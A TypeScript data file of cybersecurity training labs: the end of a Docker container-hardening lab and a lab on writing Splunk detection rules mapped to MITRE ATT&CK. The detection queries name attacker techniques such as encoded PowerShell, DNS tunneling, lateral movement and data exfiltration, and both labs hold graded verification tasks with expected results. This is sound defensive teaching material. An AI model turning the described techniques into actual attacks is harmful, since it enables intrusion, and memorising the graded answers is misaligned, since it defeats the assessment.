      commandExample: "# CIS-compliant Dockerfile\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\n\nFROM node:20-alpine\nRUN addgroup -g 1001 -S appgroup && \\\n    adduser -S appuser -u 1001 -G appgroup\nWORKDIR /app\nCOPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules\nCOPY --chown=appuser:appgroup . .\nUSER appuser\nEXPOSE 3000\nHEALTHCHECK --interval=30s --timeout=3s CMD wget -qO- http://localhost:3000/health || exit 1\nCMD [\"node\", \"server.js\"]",
      competencyChecked: "Secure image building",
    },
    {
      order: 4,
      instruction: "Run the container with security hardening flags:",
      commandExample: "docker run -d \\\n  --read-only \\\n  --tmpfs /tmp \\\n  --security-opt=no-new-privileges \\\n  --cap-drop ALL \\\n  --cap-add NET_BIND_SERVICE \\\n  --memory 256m \\\n  --cpus 0.5 \\\n  --pids-limit 50 \\\n  --network app-network \\\n  -p 3000:3000 \\\n  secure-app:latest",
      competencyChecked: "Runtime security hardening",
    },
    {
      order: 5,
      instruction: "Configure Docker daemon security: disable live restore, enable user namespace remapping, set logging driver.",
      commandExample: "# /etc/docker/daemon.json\n{\n  \"userns-remap\": \"default\",\n  \"log-driver\": \"json-file\",\n  \"log-opts\": { \"max-size\": \"10m\", \"max-file\": \"3\" },\n  \"live-restore\": false,\n  \"no-new-privileges\": true\n}",
      competencyChecked: "Daemon configuration",
    },
    {
      order: 6,
      instruction: "Create a Docker network and run the app + database with network isolation (only app can reach database).",
      commandExample: "docker network create --driver bridge app-network\ndocker network create --driver bridge db-network\n# App connects to both, DB only connects to db-network",
      competencyChecked: "Network segmentation",
    },
    {
      order: 7,
      instruction: "Re-run Docker Bench Security and compare results. Document improvements.",
      competencyChecked: "Before/after comparison",
    },
  ],
  verificationTasks: [
    { id: "v-bench-before", description: "Docker Bench baseline recorded", command: "./docker-bench-security.sh", expectedResult: "PASS/WARN/NOTE results documented", points: 5 },
    { id: "v-trivy-clean", description: "Container image has no critical vulnerabilities", command: "trivy image secure-app:latest", expectedResult: "No CRITICAL or HIGH vulnerabilities", points: 15 },
    { id: "v-nonroot", description: "Container runs as non-root user", command: "docker exec [container] whoami", expectedResult: "appuser (not root)", points: 10 },
    { id: "v-readonly", description: "Container filesystem is read-only", command: "docker exec [container] touch /testfile", expectedResult: "Read-only file system", points: 10 },
    { id: "v-resource-limits", description: "Resource limits are enforced", command: "docker inspect [container] | grep -A5 Memory", expectedResult: "Memory: 268435456 (256MB)", points: 5 },
    { id: "v-network-isolation", description: "Database is not reachable from outside", command: "curl http://db-container:5432", expectedResult: "Connection refused or timeout", points: 10 },
    { id: "v-bench-after", description: "Docker Bench score improved", command: "Compare before/after results", expectedResult: "More PASS, fewer WARN", points: 10 },
  ],
  hints: [
    "Docker Bench Security implements CIS Docker Benchmark checks automatically",
    "Trivy can also scan running containers: trivy container [container-id]",
    "--cap-drop ALL removes ALL Linux capabilities — only add back what you need",
    "Use .dockerignore to prevent secrets and unnecessary files from being in the image",
  ],
  estimatedMinutes: 60,
  competencyLevel: "advanced",
  alignsWith: "CIS Docker Benchmark v1.6, CompTIA Security+ Domain 3, CKAD Security",
};

// ════════════════════════════════════════════════════════════════
// LAB 14: SIEM Detection Rule Development
// ════════════════════════════════════════════════════════════════

export const LAB_DETECTION_RULES: LabEnvironment = {
  lessonId: "les-so-3-3",
  title: "SIEM Detection Rule Development (MITRE ATT&CK Mapped)",
  description: "Write detection rules in Splunk SPL for 5 MITRE ATT&CK techniques. Test each rule against sample attack data and measure detection accuracy.",
  objectives: [
    "Write Splunk SPL queries for 5 ATT&CK techniques",
    "Test each detection rule against benign and malicious data",
    "Calculate true positive and false positive rates",
    "Tune rules to minimize false positives",
    "Document each rule with ATT&CK mapping and tuning notes",
  ],
  setupInstructions: [
    "Access the Splunk instance with sample data (includes 7 days of normal + attack traffic)",
    "Data sources: Windows Event logs, Apache logs, DNS logs, Firewall logs, Authentication logs",
    "Pre-loaded attack datasets for each technique",
  ],
  tasks: [
    {
      order: 1,
      instruction: "Write a detection rule for T1110 (Brute Force): detect more than 10 failed login attempts from the same source within 5 minutes.",
      commandExample: "index=main sourcetype=WinEventLog:EventCode=4625\n| stats count as failed_logins by src_ip, user\n| where failed_logins > 10\n| where _time > relative_time(now(), \"-5m\")",
      competencyChecked: "Brute force detection",
    },
    {
      order: 2,
      instruction: "Write a detection rule for T1059.001 (PowerShell): detect encoded PowerShell commands (common in attacks).",
      commandExample: "index=main sourcetype=WinEventLog:ScriptBlockLogging\n| search ScriptBlockText=*-enc* OR ScriptBlockText=*FromBase64String*\n| table _time, user, host, ScriptBlockText",
      competencyChecked: "Malicious script detection",
    },
    {
      order: 3,
      instruction: "Write a detection rule for T1071.004 (DNS C2): detect DNS queries with unusually long subdomains (DNS tunneling indicator).",
      commandExample: "index=main sourcetype=dns\n| eval query_length = len(query)\n| where query_length > 50\n| stats count by src_ip, query, query_length\n| where count > 5\n| sort -count",
      competencyChecked: "DNS anomaly detection",
    },
    {
      order: 4,
      instruction: "Write a detection rule for T1021.001 (RDP Lateral Movement): detect RDP connections from unusual source-destination pairs.",
      commandExample: "index=main sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=10\n| join type=left src_ip [search index=base sourcetype=firewall NOT dest_port=3389]\n| where isnull(match)\n| table _time, src_ip, dest_ip, user",
      competencyChecked: "Lateral movement detection",
    },
    {
      order: 5,
      instruction: "Write a detection rule for T1041 (Exfiltration Over C2): detect large outbound data transfers (>100MB in 1 hour).",
      commandExample: "index=main sourcetype=firewall action=allowed direction=outbound\n| stats sum(bytes_out) as total_bytes by src_ip\n| where total_bytes > 104857600\n| eval total_MB = round(total_bytes/1048576, 2)\n| table src_ip, total_MB",
      competencyChecked: "Data exfiltration detection",
    },
    {
      order: 6,
      instruction: "Test each rule against the provided benign data. Record any false positives.",
      competencyChecked: "False positive analysis",
    },
    {
      order: 7,
      instruction: "Tune each rule to reduce false positives while maintaining detection capability.",
      competencyChecked: "Rule tuning",
    },
    {
      order: 8,
      instruction: "Document each rule in a Detection Rule Specification template.",
      competencyChecked: "Documentation",
    },
  ],
  verificationTasks: [
    { id: "v-brute-force", description: "Brute force rule fires on attack data", command: "Run SPL query", expectedResult: "Attack IPs identified with >10 failures", points: 15 },
    { id: "v-powershell", description: "Encoded PowerShell rule fires", command: "Run SPL query", expectedResult: "Suspicious PowerShell commands flagged", points: 10 },
    { id: "v-dns-tunnel", description: "DNS tunneling rule fires", command: "Run SPL query", expectedResult: "Long subdomain queries identified", points: 10 },
    { id: "v-lateral-rdp", description: "RDP lateral movement detected", command: "Run SPL query", expectedResult: "Unusual RDP connections flagged", points: 10 },
    { id: "v-exfil", description: "Data exfiltration rule fires", command: "Run SPL query", expectedResult: "Large outbound transfers identified", points: 10 },
    { id: "v-fp-rate", description: "False positive rate is <20%", command: "Count false positives vs true positives", expectedResult: "FP rate < 20% for each rule", points: 15 },
    { id: "v-documentation", description: "Detection Rule Spec document complete", command: "Manual review", expectedResult: "5 rules documented with ATT&CK mapping, query, logic, tuning notes", points: 10 },
  ],
  hints: [
    "Start with broad queries and narrow down — it's easier to filter than to find what you missed",
    "Use '| where _time > relative_time(now(), \"-5m\")' to limit results to recent events",
    "SPL is case-sensitive for field names but not for values",
    "Test with known attack data FIRST to verify detection, then test with benign data to check false positives",
  ],
  estimatedMinutes: 75,
  competencyLevel: "advanced",
  alignsWith: "MITRE ATT&CK v14, CompTIA CySA+ Domain 2, SANS SEC555",
};

// ════════════════════════════════════════════════════════════════
// ALL EXPANDED LABS
// ════════════════════════════════════════════════════════════════

export const EXPANDED_LABS: LabEnvironment[] = [
  LAB_DEVICE_CONFIG,
  LAB_VLAN_ROUTING,
  LAB_SSH_HARDENING,
  LAB_NMAP_SCANNING,
  LAB_OWASP_WEBSEC,
  LAB_DOCKER_SECURITY,
  LAB_DETECTION_RULES,
];
